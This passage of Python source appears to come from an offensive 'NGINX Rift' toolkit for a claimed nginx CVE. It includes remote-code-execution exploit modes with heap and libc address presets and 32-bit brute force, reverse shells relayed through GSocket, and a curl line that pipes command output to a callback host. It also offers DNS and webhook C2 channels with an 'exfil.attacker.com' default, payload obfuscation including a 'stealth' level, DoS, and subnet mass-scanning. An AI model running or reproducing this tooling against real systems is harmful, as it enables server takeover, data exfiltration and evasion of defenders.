                              f"{_BOLD}{gs_receiver.target_cmd(cmd)}{_RST}\n"
                              f"{_DIM}openssl fallback cmd:{_RST} "
                              f"{_BOLD}{gs_receiver.target_cmd_openssl(cmd)}{_RST}\n")
                        cmd = gs_receiver.target_cmd(cmd)
                    else:
                        print(f"{_RED}GSRN connect failed{_RST} — all relays unreachable.\n"
                              f"{_DIM}  Options:\n"
                              f"  • Switch capture to {_RST}http{_DIM} (needs your public/reachable IP)\n"
                              f"  • Enter a custom relay (e.g. your own stunnel/socat listener)\n"
                              f"  • Run: nslookup {GSRN_HOST}  to check DNS{_RST}")
                        gs_receiver = None
                        cb_method = "none"

                elif cb_method == "http":
                    cb_ip   = _ask("Your IP (reachable from target)", default="172.17.0.1")
                    cb_port = int(_ask("Callback port", default="9876"))
                    cb_state = CallbackState()
                    _cb_ready = threading.Event()
                    threading.Thread(
                        target=_run_callback_listener,
                        args=("0.0.0.0", cb_port, cb_state, _cb_ready),
                        daemon=True,
                    ).start()
                    _cb_ready.wait(5)
                    log(f"HTTP callback listener on :{cb_port}", "ok")
                    cmd = f"{cmd} | curl -sm5 -d @- http://{cb_ip}:{cb_port}/rce"

            # ─── Apply C2 Payload Processor ────
            if c2_payload_processor:
                cmd = c2_payload_processor(cmd)
                print(f"{_GRN}Command prepared with C2 method: {c2_method_name}{_RST}")

            if use_shell and not l2_mode:
                _t = threading.Thread(target=run_shell_listener, args=(lport,), daemon=True)
                _t.start()
                time.sleep(0.5)

            with _Spinner("Exploiting..."):
                result = mode_exploit(host, port, cmd, DEFAULT_HEAP_BASE,
                                      DEFAULT_LIBC_BASE, DEFAULT_SYSTEM_OFFSET,
                                      DEFAULT_HEAP_OFFSETS, 10, vhost=vhost, use_ssl=use_ssl)

            if result.success:
                print(f"\n{_BOLD}{_GRN}RCE CONFIRMED!{_RST}  addr={result.winning_addr}")
                if cb_method == "gsocket" and gs_receiver:
                    print(f"{_DIM}Waiting for GSocket output (up to 30 s)...{_RST}")
                    out = gs_receiver.wait(30)
                    gs_receiver.stop()
                    if out:
                        _print_panel(out[:3000], title="Command Output (GSocket)")
                    else:
                        print(f"{_YLW}No output received — is gs-netcat / openssl available on target?{_RST}")
                        print(f"{_DIM}openssl fallback:{_RST} "
                              f"{gs_receiver.target_cmd_openssl(result.command_sent.split('|')[0].strip())}")
                elif cb_method == "http" and cb_state:
                    print(f"{_DIM}Waiting for HTTP callback (up to 15 s)...{_RST}")
                    if cb_state.event.wait(15):
                        _print_panel(str(cb_state.output)[:3000], title="Command Output (HTTP)")
                    else:
                        print(f"{_YLW}No HTTP callback received (timeout){_RST}")
                elif use_shell and l2_mode:
                    _l1_pid = f"PID {l1_gs_proc.pid}" if l1_gs_proc else "not running"
                    _print_panel(
                        f"{_GRN}{_BOLD}Shell payload injected!{_RST} — L3 is connecting to L2 → GSocket → L1.\n\n"
                        f"  L1 listener: {_l1_pid}\n"
                        f"  secret={_CYAN}{_BOLD}{l1_tok or 'YOUR_L1_TOKEN'}{_RST}\n\n"
                        f"  {_DIM}Waiting for shell to arrive via GSocket relay...{_RST}",
                        title="L2 Relay — Shell Incoming",
                    )
                    if l1_gs_proc:
                        forward_gsocket_shell(l1_gs_proc, l1_tok)
                    else:
                        print(f"{_YLW}Start L1 manually:{_RST} "
                              f"{_CYAN}{_BOLD}gs-netcat -l -s \"{l1_tok or 'YOUR_L1_TOKEN'}\"{_RST}")
            else:
                print(f"{_RED}Exploit failed: {result.error or 'no crash'}{_RST}")

        elif choice == "4":
            target = _ask("Target (host:port)", default="127.0.0.1:19331")
            parsed = parse_target(target)
            if not parsed:
                print(f"{_RED}Invalid target{_RST}")
                continue
            host, port, vhost, use_ssl = parsed
            cb_ip  = _ask("Callback IP", default="host.docker.internal")
            cb_port = int(_ask("Callback port", default="9876"))
            cmd = _ask("Command", default="id")
            print(f"{_YLW}Starting 32-bit brute-force — this may take a while{_RST}")
            r = mode_exploit_32(host, port, cmd, cb_ip, cb_port,
                                DEFAULT_HEAP_PAGE_MIN, DEFAULT_HEAP_PAGE_MAX,
                                DEFAULT_LIBC_PAGE_MIN, DEFAULT_LIBC_PAGE_MAX,
                                DEFAULT_SYSTEM_OFF_32, DEFAULT_SPRAY_INTERNAL_OFF_32,
                                DEFAULT_N_PLUS_32, vhost=vhost, use_ssl=use_ssl)
            if r.get("success"):
                print(f"{_GRN}RCE CONFIRMED! Output: {r.get('output')}{_RST}")
            else:
                print(f"{_RED}Brute-force exhausted: {r.get('attempts_tried', 0)} tries{_RST}")

        elif choice == "5":
            target = _ask("Target (host:port)", default="192.168.1.100")
            parsed = parse_target(target)
            if not parsed:
                print(f"{_RED}Invalid target{_RST}")
                continue
            host, _, _, _ = parsed
            user    = _ask("SSH user", default="root")
            use_key = _confirm("Use SSH key?", default=False)
            key_path = _ask("Key path") if use_key else None
            password = None if use_key else _ask("Password", password=True)
            dry = _confirm("Dry run?", default=False)
            r = patch_server(host, port=22, user=user, password=password,
                             key_path=key_path, dry_run=dry)
            _print_panel(json.dumps(r, indent=2)[:800], title="Patch Result")

        elif choice == "6":
            target = _ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = parse_target(target)
            if not parsed:
                print(f"{_RED}Invalid target{_RST}")
                continue
            host, port, vhost, use_ssl = parsed
            with _Spinner("Auditing..."):
                hdrs  = audit_headers(host, port, vhost=vhost, use_ssl=use_ssl)
                paths = path_discovery(host, port, vhost=vhost, use_ssl=use_ssl)
                tls   = tls_audit(host, port, vhost=vhost)
            _print_panel(
                "\n".join(
                    f"{k}: {'OK' if v['present'] else '--'} {(v.get('value') or '')[:40]}"
                    for k, v in hdrs.items() if isinstance(v, dict)
                ),
                title="Security Headers",
            )
            found_paths = [p["path"] + " -> " + p["status"] for p in paths.get("paths_found", [])]
            if found_paths:
                _print_panel("\n".join(found_paths[:10]), title="Paths Found")
            print(f"TLS: {tls}")

        elif choice == "7":
            subnet = _ask("CIDR subnet", default="192.168.1.0/24")
            port   = int(_ask("Port", default=str(DEFAULT_PORT)))
            output = _ask("Output file (HTML/JSON)", default="scan_report.html")
            auto_scan(subnet, port, output=output)

        elif choice == "8":
            target = _ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
            parsed = parse_target(target)
            if not parsed:
                print(f"{_RED}Invalid target{_RST}")
                continue
            host, port, vhost, use_ssl = parsed
            size = int(_ask("Overflow size", default="200"))
            r = mode_dos(host, port, size, vhost=vhost, use_ssl=use_ssl)
            _print_panel(json.dumps(r, indent=2), title="DoS Result")

        elif choice == "9":
            fmt = _ask("Format", choices=["html", "json"], default="html")
            out = _ask("Output path", default=f"report.{fmt}")
            data = {"timestamp": str(datetime.now()), "tool": "nginx-rift-super-toolkit",
                    "version": VERSION, "note": "Report generated from interactive mode"}
            if fmt == "html":
                generate_html_scan_report([], out)
            else:
                generate_json_report(data, out)

        elif choice == "10":
            src = _ask("Target list file (one target per line, or paste targets separated by commas)")
            targets: list[str] = []
            if "," in src and not Path(src).exists():
                targets = [t.strip() for t in src.split(",") if t.strip()]
            else:
                try:
                    targets = Path(src).read_text().splitlines()
                except OSError as e:
                    print(f"{_RED}Cannot read file: {e}{_RST}")
                    input("\nPress Enter to continue...")
                    _clr()
                    continue
            output_path = _ask("Output file (HTML/JSON, blank to skip)", default="")
            workers = int(_ask("Worker threads", default="20"))
            with _Spinner(f"Checking {len(targets)} targets..."):
                results = bulk_fingerprint_check(targets, workers=workers,
                                                 output=output_path or None)
            vuln_count = sum(1 for r in results if r.get("vulnerable"))
            safe_count = sum(1 for r in results if r.get("vulnerable") is False)
            rows = []
            for r in sorted(results, key=lambda x: x.get("vulnerable") or False, reverse=True):
                vuln  = r.get("vulnerable")
                v_str = f"{_RED}YES{_RST}" if vuln else (f"{_GRN}NO{_RST}" if vuln is False else f"{_DIM}?{_RST}")
                cves  = ",".join(r.get("matched_cves") or []) or "-"
                waf   = ",".join(r.get("waf") or []) or "-"
                rows.append([r.get("target", "?"), r.get("nginx_version", "?"), v_str, cves, waf])
            _print_table(["Target", "nginx", "Vuln?", "CVEs", "WAF"], rows,
                         title=f"Bulk Results — {len(results)} checked")
            print(f"  Vulnerable: {_RED}{vuln_count}{_RST}   "
                  f"Safe: {_GRN}{safe_count}{_RST}   "
                  f"Unknown: {_DIM}{len(results) - vuln_count - safe_count}{_RST}")

        elif choice == "11":
            # ── Listener-Only Mode ──
            print(f"\n{_MAG}{_BOLD}═══════════════════════════════════════════════════════════════{_RST}")
            print(f"{_MAG}{_BOLD}LISTENER-ONLY MODE — Capture Incoming C2 Callbacks{_RST}")
            print(f"{_MAG}{_BOLD}═══════════════════════════════════════════════════════════════{_RST}\n")
            
            listen_type = _ask("Listener type", 
                             choices=["tcp", "http", "dns", "ws", "all"], 
                             default="tcp")
            listen_ip = _ask("Bind IP", default="0.0.0.0")
            
            # Default ports by type
            default_ports = {"tcp": "4444", "http": "8888", "dns": "53", "ws": "9999", "all": "0"}
            default_port = default_ports.get(listen_type, "4444")
            listen_port = int(_ask("Port (0 = auto)", default=default_port))
            
            timeout_input = _ask("Timeout in seconds (0 = infinite)", default="0")
            timeout = int(timeout_input) if timeout_input else 0
            
            save_output = _confirm("Save captured packets to file?", default=False)
            output_file = _ask("Output file path") if save_output else None
            verbose = _confirm("Verbose mode (show raw data)?", default=False)
            
            print(f"\n{_GRN}Starting {listen_type.upper()} listener on {listen_ip}:{listen_port or 'auto'}...{_RST}")
            print(f"{_DIM}Press Ctrl+C to stop and view captured packets{_RST}\n")
            
            result = mode_listen_only(
                listen_type=listen_type,
                listen_ip=listen_ip,
                listen_port=listen_port,
                timeout=timeout,
                output_file=output_file,
                verbose=verbose,
            )
            
            # Display summary
            print(f"\n{_GRN}Capture Summary:{_RST}")
            print(f"  Listener Type: {result['listen_type']}")
            print(f"  Bind Address: {result['listen_ip']}")
            print(f"  Total Captured: {_GRN}{result['captured_count']}{_RST} packets")
            
            if result["packets"]:
                print(f"\n{_GRN}Captured Packets:{_RST}")
                for i, pkt in enumerate(result["packets"], 1):
                    print(f"\n  [{i}] {pkt['timestamp']}")
                    print(f"      Type: {pkt['type'].upper()}")
                    print(f"      Source: {pkt['source']}")
                    print(f"      Size: {pkt.get('size', 0)} bytes")
                    if pkt.get("decoded"):
                        decoded_preview = pkt["decoded"][:100].replace("\n", " ")
                        print(f"      Data: {decoded_preview}")
            
            if output_file:
                print(f"\n{_GRN}✓ Output saved to: {output_file}{_RST}")

        input("\nPress Enter to continue...")
        _clr()


# ═══════════════════════════════════════════════════════════════════════
# C2 INTEGRATION HELPERS
# ═══════════════════════════════════════════════════════════════════════

def _prepare_c2_method(args) -> tuple | None:
    """
    Prepare C2 method based on CLI args. Returns (method, payload_processor).
    
    Args:
        args: argparse Namespace with c2/obfuscate/verify flags
        
    Returns:
        Tuple of (c2_method_instance, cmd_wrapper_function) or None
    """
    if not _C2_AVAILABLE or not args.c2:
        return None
    
    try:
        c2_method = None
        
        if args.c2 == "tcp":
            c2_method = TCPReverseShell(lhost=args.lhost, lport=args.lport)
        elif args.c2 == "http" and args.callback_ip:
            c2_method = HTTPCallback()
        elif args.c2 == "dns" and args.c2_dns_server:
            from c2_methods import DNSExfiltration
            c2_method = DNSExfiltration(dns_server=args.c2_dns_server, domain=args.c2_domain)
        elif args.c2 == "slack" and args.c2_webhook:
            from c2_methods import SlackWebhook
            c2_method = SlackWebhook(webhook_url=args.c2_webhook)
        elif args.c2 == "discord" and args.c2_webhook:
            from c2_methods import DiscordWebhook
            c2_method = DiscordWebhook(webhook_url=args.c2_webhook)
        elif args.c2 == "telegram" and args.c2_webhook:
            from c2_methods import TelegramBot
            c2_method = TelegramBot(webhook_url=args.c2_webhook)
        elif args.c2 == "auto" and args.c2_fallback:
            # Will use fallback chain instead
            return ("fallback", None)
        
        if not c2_method:
            return None
        
        # Build payload processor that applies obfuscation & verification
        def process_payload(cmd: str) -> str:
            # Apply verification wrapping
            if args.verify:
                cmd = CommandVerifier.wrap_with_markers(cmd)
            
            # Apply obfuscation
            if args.obfuscate and _C2_AVAILABLE:
                if args.obfuscate == "light":
                    cmd = ObfuscationProfile.light_obfuscation(cmd)
                elif args.obfuscate == "medium":
                    cmd = ObfuscationProfile.medium_obfuscation(cmd)
                elif args.obfuscate == "heavy":
                    cmd = ObfuscationProfile.heavy_obfuscation(cmd)
                elif args.obfuscate == "stealth":
                    cmd = ObfuscationProfile.stealth_obfuscation(cmd)
            
            return cmd
        
        return (c2_method, process_payload)
    
    except Exception as e:
        log(f"C2 setup failed: {e}", "err")
        return None


# ═══════════════════════════════════════════════════════════════════════
# CLI ARGUMENT PARSER
# ═══════════════════════════════════════════════════════════════════════

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="nginx-rift-super-toolkit.py",
        description="CVE-2026-42945 (NGINX Rift) Super Toolkit — merged from 9 repos",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python nginx-rift-super-toolkit.py --check 192.168.1.100:19321
  python nginx-rift-super-toolkit.py --exploit --host 10.0.0.5 --cmd id
  python nginx-rift-super-toolkit.py --auto-scan 192.168.1.0/24 -o report.html
  python nginx-rift-super-toolkit.py --scan-subnet 192.168.1.0/24 --port 19321
  python nginx-rift-super-toolkit.py --bruteforce-32 127.0.0.1:19331 callback.ip
  python nginx-rift-super-toolkit.py --patch 192.168.1.100 --user root --password ...
  python nginx-rift-super-toolkit.py --audit example.com:443
  python nginx-rift-super-toolkit.py --dos --host 127.0.0.1 --port 19321

Option 3 — Direct Reverse Shell (port is auto-freed before binding):
  python nginx-rift-super-toolkit.py --shell -t 10.0.0.5:19321 --lhost 10.0.0.1 --lport 4444
  python nginx-rift-super-toolkit.py --shell -t 10.0.0.5:19321 --lhost 10.0.0.1 --lport 4444 --known-build 1.25.3-glibc
  python nginx-rift-super-toolkit.py --shell -t 10.0.0.5:19321 --lhost 10.0.0.1 --lport 4444 --known-build 1.30.0-glibc
  python nginx-rift-super-toolkit.py --shell -t 10.0.0.5:19321 --lhost 10.0.0.1 --lport 4444 --no-kill-port

Listener-Only Mode (capture callbacks from already exploited targets):
  python nginx-rift-super-toolkit.py --listen-only --listen-type tcp --listen-port-capture 4444
  python nginx-rift-super-toolkit.py --listen-only --listen-type http --listen-port-capture 8888
  python nginx-rift-super-toolkit.py --listen-only --listen-type all --listen-verbose
  python nginx-rift-super-toolkit.py --listen-only --listen-type dns --listen-port-capture 53 --listen-timeout 120
        """
    )

    # Generic target
    p.add_argument("--host", default="127.0.0.1", help="target host")
    p.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"target port (default {DEFAULT_PORT})")
    p.add_argument("-t", "--target", help="target as host:port (overrides --host/--port)")

    # Modes
    p.add_argument("--check", action="store_true", help="detect-only: fingerprint + vuln pattern check (no overflow)")
    p.add_argument("--exploit", action="store_true", help="full RCE exploitation")
    p.add_argument("--shell", action="store_true", help="reverse shell mode")
    p.add_argument("--dos", action="store_true", help="DoS crash verification")

    # Exploit params
    p.add_argument("--cmd", help="command to execute via system()")
    p.add_argument("--lhost", default="172.17.0.1", help="reverse shell listener IP")
    p.add_argument("--lport", "--listen-port", type=int, default=1337, help="reverse shell port")
    p.add_argument("--l2relay", action="store_true",
                   help="L2 relay mode: rev shell connects to external relay, not a local listener")
    p.add_argument("--l2-relay-ip", metavar="IP",
                   help="L2 relay machine IP (Relay IP from gsocket-relay.sh)")
    p.add_argument("--l2-relay-port", type=int, default=12345, metavar="PORT",
                   help="L2 relay port (default: 12345)")
    p.add_argument("--l1-token", metavar="TOKEN", default="",
                   help="L1 GSocket token for display (from gsocket-relay.sh)")
    p.add_argument("--l2-secret", metavar="SECRET", default="",
                   help="L2 local secret for display (from gsocket-relay.sh)")
    p.add_argument(
        "--known-build", metavar="BUILD",
        choices=list(KNOWN_BUILDS.keys()),
        help=(
            "use a known-build preset (sets --heap-base/--libc-base/--system-offset/--offsets automatically). "
            f"Choices: {', '.join(k for k in KNOWN_BUILDS if k != '_default')}"
        ),
    )
    p.add_argument("--no-kill-port", action="store_true",
                   help="skip killing the existing listener on the bind port before starting (default: auto-kill)")
    p.add_argument("--heap-base", type=parse_int, help=f"heap base (default: {hex(DEFAULT_HEAP_BASE)})")
    p.add_argument("--libc-base", type=parse_int, help=f"libc base (default: {hex(DEFAULT_LIBC_BASE)})")
    p.add_argument("--system-offset", type=parse_int, default=DEFAULT_SYSTEM_OFFSET,
                   help=f"system() offset (default: {hex(DEFAULT_SYSTEM_OFFSET)})")
    p.add_argument("--offsets", type=str, help="comma-separated heap offsets")
    p.add_argument("--tries", type=int, default=10, help="attempts per candidate")
    p.add_argument("--n-spray", type=int, default=N_SPRAY, help="spray body count")
    p.add_argument("--body-len", type=int, default=BODY_LEN, help="spray body length")
    p.add_argument("--no-safe-check", action="store_true", help="skip URI-safe byte filtering")

    # 32-bit brute-force
    p.add_argument("--bruteforce-32", nargs=2, metavar=("TARGET", "CALLBACK_IP"),
                   help="32-bit remote brute-force RCE")

    # Subnet scan
    p.add_argument("--scan-subnet", metavar="CIDR", help="scan CIDR subnet for live hosts")
    p.add_argument("--scan-ssh", action="store_true", help="scan with SSH version detection")
    p.add_argument("--user", default="root", help="SSH user")
    p.add_argument("--password", help="SSH password")
    p.add_argument("--key", "--key-path", dest="key_path", help="SSH private key path")
    p.add_argument("--workers", type=int, default=20, help="scan worker threads")

    # Auto modes
    p.add_argument("--auto-scan", metavar="CIDR", help="auto-scan: discover + fingerprint + report")
    p.add_argument("--auto-patch", metavar="CIDR", help="auto-patch: scan + patch + verify")
    p.add_argument("--auto-exploit", metavar="TARGET", help="auto-exploit: fingerprint + exploit + report")

    # Patch
    p.add_argument("--patch", metavar="HOST", help="SSH remote patching of a single host")
    p.add_argument("--dry-run", action="store_true", help="patch dry-run simulation")

    # Output capture (exploit mode)
    p.add_argument("--gsocket", action="store_true",
                   help="capture RCE output via GSocket/GSRN relay (no public IP required)")
    p.add_argument("--gs-secret", metavar="SECRET",
                   help="GSocket shared secret (auto-generated if omitted)")
    p.add_argument("--gs-relay", metavar="HOST:PORT", default=f"{GSRN_HOST}:{GSRN_PORT}",
                   help=f"GSRN relay address (default: {GSRN_HOST}:{GSRN_PORT})")
    p.add_argument("--callback-ip", metavar="IP",
                   help="HTTP callback IP (direct, requires public IP reachable from target)")
    p.add_argument("--callback-port", type=int, default=9876,
                   help="HTTP callback port (default: 9876)")

    # Bulk check
    p.add_argument("--bulk-check", metavar="FILE",
                   help="bulk fingerprint+vuln check from a target list file (one target per line)")

    # Web audit
    p.add_argument("--audit", metavar="TARGET", help="full web audit (headers, paths, TLS, WAF)")
    p.add_argument("--audit-headers", action="store_true", help="check security headers only")
    p.add_argument("--audit-paths", action="store_true", help="discover interesting paths")

    # Output
    p.add_argument("-o", "--output", help="output file (HTML or JSON)")
    p.add_argument("-j", "--json", action="store_true", help="JSON output mode")
    p.add_argument("--verbose", "-v", action="store_true", help="verbose output")

    # ─── C2 Method Selection & Obfuscation (if available) ────
    if _C2_AVAILABLE:
        p.add_argument("--c2", metavar="METHOD", 
                       choices=["tcp", "http", "dns", "icmp", "ws", "slack", "discord", "telegram", "gsocket", "l2relay", "auto"],
                       help="C2 method for RCE (auto=fallback chain)")
        p.add_argument("--c2-url", metavar="URL", help="C2 callback URL")
        p.add_argument("--c2-webhook", metavar="URL", help="Webhook URL (Slack/Discord/Telegram)")
        p.add_argument("--c2-dns-server", metavar="IP", help="DNS server for DNS exfiltration")
        p.add_argument("--c2-domain", metavar="DOMAIN", default="exfil.attacker.com", help="Domain for DNS exfil")
        p.add_argument("--c2-timeout", type=int, default=120, help="C2 listener timeout (default: 120s)")
        p.add_argument("--c2-fallback", action="store_true", help="Enable auto-fallback between C2 methods")
        p.add_argument("--obfuscate", metavar="LEVEL", 
                       choices=["light", "medium", "heavy", "stealth"],
                       help="Payload obfuscation level")
        p.add_argument("--verify", action="store_true", help="Enable command execution verification")
        p.add_argument("--verify-method", metavar="METHOD",
                       choices=["markers", "checksum", "size"],
                       default="markers", help="Verification method")

    # ─── Listener-Only Mode ───────────────────────────────────────────────────
    listen_grp = p.add_argument_group("Listener-Only Mode (capture incoming callbacks)")
    listen_grp.add_argument("--listen-only", action="store_true",
                           help="Run in listener-only mode (no exploit, just capture callbacks)")
    listen_grp.add_argument("--listen-type", metavar="TYPE",
                           choices=["tcp", "http", "dns", "ws", "all"],
                           default="tcp",
                           help="Listener type: tcp|http|dns|ws|all (default: tcp)")
    listen_grp.add_argument("--listen-ip", default="0.0.0.0",
                           help="IP to bind listener to (default: 0.0.0.0)")
    listen_grp.add_argument("--listen-port-capture", type=int, default=0, metavar="PORT",
                           help="Port for listener (0 = auto by type: tcp=4444, http=8888, dns=53, ws=9999)")
    listen_grp.add_argument("--listen-timeout", type=int, default=0, metavar="SEC",
                           help="Listener timeout in seconds (0 = infinite, Ctrl+C to stop)")
    listen_grp.add_argument("--listen-output", metavar="FILE",
                           help="Save captured packets to file")
    listen_grp.add_argument("--listen-verbose", action="store_true",
                           help="Show raw packet data for debugging")

    return p


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

def main():
    parser = build_parser()
    args = parser.parse_args()

    # If no arguments at all, launch interactive TUI
    if len(sys.argv) == 1:
        run_interactive()
        return 0

    # Apply global flags early
    global _KILL_PORT
    if args.no_kill_port:
        _KILL_PORT = False

    # Resolve target
    host = args.host
    port = args.port
    vhost = host
    use_ssl = (port == 443)
    if args.target:
        parsed = parse_target(args.target)
        if parsed:
            host, port, vhost, use_ssl = parsed

    parsed_offsets = DEFAULT_HEAP_OFFSETS
    if args.offsets:
        parsed_offsets = [parse_int(x.strip()) for x in args.offsets.split(",") if x.strip()]

    heap_base = args.heap_base or DEFAULT_HEAP_BASE
    libc_base = args.libc_base or DEFAULT_LIBC_BASE

    # Apply known-build preset (overrides individual heap/libc/offset flags)
    if args.known_build:
        kb = KNOWN_BUILDS[args.known_build]
        heap_base          = kb["heap_base"]
        libc_base          = kb["libc_base"]
        args.system_offset = kb["sys_offset"]
        parsed_offsets     = kb["offsets"]
        log(f"Known build '{args.known_build}': heap={hex(heap_base)} libc={hex(libc_base)} sys_off={hex(args.system_offset)}", "info")

    # ── CHECK (detect-only) ──
    if args.check:
        result = mode_check(host, port, vhost=vhost, use_ssl=use_ssl)
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            for k, v in result.items():
                print(f"{k}: {v}")
        return 0 if result.get("verdict") and "present" in str(result.get("verdict")) else 1

    # ── 32-bit BRUTE FORCE ──
    if args.bruteforce_32:
        target, cb_ip = args.bruteforce_32
        parsed = parse_target(target)
        if not parsed:
            print("Invalid target for --bruteforce-32. Use host:port format.")
            return 1
        bh, bp, bv, bs = parsed
        result = mode_exploit_32(bh, bp, args.cmd or "id", cb_ip, args.lport,
                                DEFAULT_HEAP_PAGE_MIN, DEFAULT_HEAP_PAGE_MAX,
                                DEFAULT_LIBC_PAGE_MIN, DEFAULT_LIBC_PAGE_MAX,
                                args.system_offset, DEFAULT_SPRAY_INTERNAL_OFF_32,
                                DEFAULT_N_PLUS_32, vhost=bv, use_ssl=bs)
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            if result.get("success"):
                print(f"[+] RCE CONFIRMED! Output: {result.get('output')}")
            else:
                print(f"[-] Brute-force exhausted: {result.get('attempts_tried', 0)} tries")
        return 0 if result.get("success") else 2

    # ── EXPLOIT ──
    if args.exploit or args.shell or args.l2relay:
        cmd = args.cmd or ""
        if args.l2relay:
            if not args.l2_relay_ip:
                print("--l2relay requires --l2-relay-ip")
                return 1
            cmd = build_l2_payload(args.l2_relay_ip, args.l2_relay_port)
            show_l2relay_panel(
                args.l2_relay_ip, args.l2_relay_port,
                args.l1_token, args.l2_secret, cmd,
            )
        elif args.shell:
            cmd = build_reverse_shell_cmd(args.lhost, args.lport)
        if not cmd:
            print("--exploit requires --cmd, --shell, or --l2relay")
            return 1

        # ─── C2 Integration ────────────────────────────────────────
        _c2_result = _prepare_c2_method(args)
        if _c2_result:
            if _c2_result[0] == "fallback" and _C2_AVAILABLE:
                # Use fallback chain for auto C2 selection
                from c2_methods import C2Registry
                fallback_methods = [C2Registry.get(m)() for m in ["dns", "tcp", "slack"] if C2Registry.get(m)]
                from c2_fallback import C2FallbackChain
                chain = C2FallbackChain(fallback_methods)
                log("C2 Fallback chain enabled (dns → tcp → slack)", "info")
            else:
                c2_method, payload_processor = _c2_result
                if payload_processor:
                    cmd = payload_processor(cmd)
                    log(f"Command prepared with C2 method: {args.c2}", "ok")

        _gs_receiver: GSocketCallbackReceiver | None = None
        _cb_state:    CallbackState | None = None

        if not args.shell:
            if args.gsocket:
                _rh, _, _rp = args.gs_relay.partition(":")
                _gs_receiver = GSocketCallbackReceiver(
                    args.gs_secret or None, _rh, int(_rp) if _rp else GSRN_PORT
                )
                log("Connecting to GSRN relay...", "info")
                if _gs_receiver.start():
                    log(f"GSRN ready  secret={_gs_receiver.secret}", "ok")
                    log(f"gs-netcat target cmd: {_gs_receiver.target_cmd(cmd)}", "info")
                    log(f"openssl fallback:     {_gs_receiver.target_cmd_openssl(cmd)}", "info")
                    cmd = _gs_receiver.target_cmd(cmd)
                else:
                    log("GSRN connect failed — proceeding without output capture", "warn")
                    _gs_receiver = None
            elif args.callback_ip:
                _cb_state = CallbackState()
                _cb_ready = threading.Event()
                threading.Thread(
                    target=_run_callback_listener,
                    args=("0.0.0.0", args.callback_port, _cb_state, _cb_ready),
                    daemon=True,
                ).start()
                _cb_ready.wait(5)
                log(f"HTTP callback listener on :{args.callback_port}", "ok")
                cmd = f"{cmd} | curl -sm5 -d @- http://{args.callback_ip}:{args.callback_port}/rce"

        if args.shell and not args.l2relay:
            t = threading.Thread(target=run_shell_listener, args=(args.lport,), daemon=True)
            t.start()
            time.sleep(0.5)

        result = mode_exploit(host, port, cmd, heap_base, libc_base,
                             args.system_offset, parsed_offsets, args.tries,
                             vhost=vhost, use_ssl=use_ssl)

        # Collect callback output
        if result.success:
            if _gs_receiver:
                log("Waiting for GSocket output (30 s)...", "info")
                result.output = _gs_receiver.wait(30)
                _gs_receiver.stop()
                if not result.output:
                    log("No GSocket output received (timeout)", "warn")
            elif _cb_state:
                log("Waiting for HTTP callback (15 s)...", "info")
                if _cb_state.event.wait(15):
                    result.output = _cb_state.output
                else:
                    log("No HTTP callback received (timeout)", "warn")

        if args.json:
            print(json.dumps({
                "success": result.success, "winning_addr": result.winning_addr,
                "command_sent": result.command_sent, "output": result.output,
                "attempts": result.attempts, "error": result.error,
            }, indent=2))
        else:
            if result.success:
                print(f"[+] RCE CONFIRMED! Command sent: {cmd}")
                print(f"[+] Winning address: {result.winning_addr}")
                if result.output:
                    print(f"[+] Output:\n{result.output}")
            else:
                print(f"[-] Exploit failed: {result.error or 'no crash detected'}")
        return 0 if result.success else 3

    # ── LISTENER-ONLY MODE ──
    if args.listen_only:
        print(f"\n{_CYAN}{_BOLD}═══════════════════════════════════════════════════════════════{_RST}")
        print(f"{_CYAN}{_BOLD}LISTENER-ONLY MODE — Capturing Incoming C2 Callbacks{_RST}")
        print(f"{_CYAN}{_BOLD}═══════════════════════════════════════════════════════════════{_RST}\n")
        
        result = mode_listen_only(
            listen_type=args.listen_type,
            listen_ip=args.listen_ip,
            listen_port=args.listen_port_capture,
            timeout=args.listen_timeout,
            output_file=args.listen_output,
            verbose=args.listen_verbose,
        )
        
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            print(f"\n{_GRN}Capture Summary:{_RST}")
            print(f"  Listener Type: {result['listen_type']}")
            print(f"  Bind Address: {result['listen_ip']}")
            print(f"  Timeout: {result['timeout']}s (0 = infinite)")
            print(f"  Total Captured: {_GRN}{result['captured_count']}{_RST} packets")
            
            if result["packets"]:
                print(f"\n{_GRN}Captured Packets:{_RST}")
                for i, pkt in enumerate(result["packets"], 1):
                    print(f"\n  [{i}] {pkt['timestamp']}")
                    print(f"      Type: {pkt['type'].upper()}")
                    print(f"      Source: {pkt['source']}")
                    print(f"      Size: {pkt.get('size', 0)} bytes")
                    if pkt.get("decoded"):
                        decoded_preview = pkt["decoded"][:100].replace("\n", " ")
                        print(f"      Data: {decoded_preview}")
            
            if result["errors"]:
                print(f"\n{_RED}Errors:{_RST}")
                for err in result["errors"]:
                    print(f"  - {err}")
            
            if result.get("end_time"):
                print(f"\n  Duration: {result['start_time']} → {result['end_time']}")
            
            if args.listen_output:
                print(f"\n{_GRN}✓ Output saved to: {args.listen_output}{_RST}")
        
        return 0 if result["captured_count"] > 0 else 1

    # ── DoS ──
    if args.dos:
        result = mode_dos(host, port, vhost=vhost, use_ssl=use_ssl)
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            if result.get("vulnerable"):
                print("[!] Target appears VULNERABLE (worker crashed + recovered)")
            else:
                print("[*] No crash detected")
        return 1 if result.get("vulnerable") else 0

    # ── SUBNET SCAN ──
    if args.scan_subnet:
        hosts = scan_subnet(args.scan_subnet, port, args.workers)
        results = []
        for h in hosts:
            svc = detect_service(h, port, vhost=h) # vhost is IP for subnet scan
            if svc.get("alive") and args.scan_ssh:
                ssh = scan_ssh(h, user=args.user, password=args.password, key_path=args.key_path)
                svc.update(ssh)
            results.append(svc)
        if args.output:
            if args.output.endswith(".json"):
                generate_json_report({"scan_results": results}, args.output)
            else:
                generate_html_scan_report(results, args.output)
        print_scan_results(results)
        return 0

    # ── PATCH ──
    if args.patch:
        result = patch_server(args.patch, 22, args.user, args.password,
                             args.key_path, args.dry_run)
        if args.json:
            print(json.dumps(result, indent=2))
        else:
            print(f"[{result['status']}] {args.patch}")
            for step in result.get("steps", []):
